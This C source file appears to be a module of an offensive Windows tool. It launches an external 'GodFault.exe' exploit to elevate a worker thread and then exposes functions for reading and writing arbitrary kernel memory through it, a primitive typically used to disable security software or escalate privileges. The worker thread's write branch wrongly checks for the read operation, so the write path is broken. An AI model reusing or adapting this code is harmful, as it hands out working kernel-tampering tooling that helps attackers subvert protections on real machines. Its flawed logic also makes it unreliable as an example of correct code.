#define _CRT_SECURE_NO_WARNINGS

#include <ntstatus.h>
#define WIN32_NO_STATUS
#include <Windows.h>
#include <winternl.h>
#include <assert.h>
#include <tchar.h>

#if NO_STRINGS
#define _putts_or_not(...)
#define _tprintf_or_not(...)
#define wprintf_or_not(...)
#define printf_or_not(...)
#pragma warning(disable : 4189)

#else
#define _putts_or_not(...) _putts(__VA_ARGS__)
#define _tprintf_or_not(...) _tprintf(__VA_ARGS__)
#define printf_or_not(...) printf(__VA_ARGS__)
#define wprintf_or_not(...) wprintf(__VA_ARGS__)
#endif

typedef enum
{
    WorkerThreadOperation_Read = 0,
    WorkerThreadOperation_Write = 1,
    WorkerThreadOperation_Shutdown = 2,
} WorkerThreadOperation;

typedef struct
{
    SRWLOCK lock;

    HANDLE hWorkerThread;

    HANDLE hWorkerThreadSignal;
    HANDLE hWorkerThreadComplete;

    WorkerThreadOperation op;
    PVOID Address;
    PVOID Buffer;
    SIZE_T Size;
    SIZE_T BytesReturned;
} WorkerThreadInfo;

WorkerThreadInfo gWorkerThreadInfo = { 0 };

DWORD WINAPI BlessedThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);

    while (TRUE)
    {
        WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadSignal, INFINITE);

        if (WorkerThreadOperation_Shutdown == gWorkerThreadInfo.op)
        {
            TerminateThread(GetCurrentThread(), 0);
        }

        AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
        {
            if (WorkerThreadOperation_Read == gWorkerThreadInfo.op)
            {
                ReadProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
            }
            else if (WorkerThreadOperation_Read == gWorkerThreadInfo.op)
            {
                WriteProcessMemory(GetCurrentProcess(), gWorkerThreadInfo.Address, gWorkerThreadInfo.Buffer, gWorkerThreadInfo.Size, &gWorkerThreadInfo.BytesReturned);
            }

            SetEvent(gWorkerThreadInfo.hWorkerThreadComplete);
        }
        ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);
    }
}

HANDLE GetDriverHandle_GodFault()
{
    STARTUPINFOW startInfo = { 0 };
    PROCESS_INFORMATION procInfo = { 0 };
    DWORD dwExitCode = 0;
    wchar_t commandLine[MAX_PATH] = { 0 };

    if (NULL != gWorkerThreadInfo.hWorkerThread) {
        return gWorkerThreadInfo.hWorkerThread;
    }

    gWorkerThreadInfo.hWorkerThreadSignal = CreateEvent(NULL, FALSE, FALSE, NULL);
    gWorkerThreadInfo.hWorkerThreadComplete = CreateEvent(NULL, FALSE, FALSE, NULL);
    gWorkerThreadInfo.hWorkerThread = CreateThread(NULL, 0, BlessedThread, NULL, 0, NULL);
    Sleep(500);

    // Launch GodFault to bless the thread
    
    startInfo.cb = sizeof(startInfo);
    _snwprintf(commandLine, _countof(commandLine), L"GodFault.exe -t %u", GetThreadId(gWorkerThreadInfo.hWorkerThread));

    if (!CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &startInfo, &procInfo))
    {
        _tprintf_or_not(TEXT("[!] CreateProcessW(GodFault) failed, exiting...\n"));
        exit(EXIT_FAILURE);
    }
    
    if ((WAIT_OBJECT_0 != WaitForSingleObject(procInfo.hProcess, INFINITE)) ||
        !GetExitCodeProcess(procInfo.hProcess, &dwExitCode) || 
        (0 != dwExitCode))
    {
        _tprintf_or_not(TEXT("[!] GodFault returned failure, exiting...\n"));
        exit(EXIT_FAILURE);
    }

    return gWorkerThreadInfo.hWorkerThread;
}

VOID CloseDriverHandle_GodFault()
{
    //TerminateThread(gWorkerThreadInfo.hWorkerThread, 0);
}

VOID ReadMemoryPrimitive_GodFault(SIZE_T Size, DWORD64 Address, PVOID Buffer) 
{
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    GetDriverHandle_GodFault();

    AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
    {
        gWorkerThreadInfo.op = WorkerThreadOperation_Read;
        gWorkerThreadInfo.Address = (PVOID)Address;
        gWorkerThreadInfo.Size = Size;
        gWorkerThreadInfo.Buffer = Buffer;
        SetEvent(gWorkerThreadInfo.hWorkerThreadSignal);
    }
    ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);
    
    WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadComplete, INFINITE);
}

VOID WriteMemoryPrimitive_GodFault(SIZE_T Size, DWORD64 Address, PVOID Buffer)
{
    if (Address < 0x0000800000000000) {
        _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), Address);
        exit(1);
    }
    if (Address < 0xFFFF800000000000) {
        _tprintf_or_not(TEXT("Non canonical address used: 0x%016llx\nAborting to avoid a BSOD...\n"), Address);
        exit(1);
    }

    GetDriverHandle_GodFault();

    AcquireSRWLockExclusive(&gWorkerThreadInfo.lock);
    {
        gWorkerThreadInfo.op = WorkerThreadOperation_Write;
        gWorkerThreadInfo.Address = (PVOID)Address;
        gWorkerThreadInfo.Size = Size;
        gWorkerThreadInfo.Buffer = Buffer;
        SetEvent(gWorkerThreadInfo.hWorkerThreadSignal);
    }
    ReleaseSRWLockExclusive(&gWorkerThreadInfo.lock);

    WaitForSingleObject(gWorkerThreadInfo.hWorkerThreadComplete, INFINITE);
}

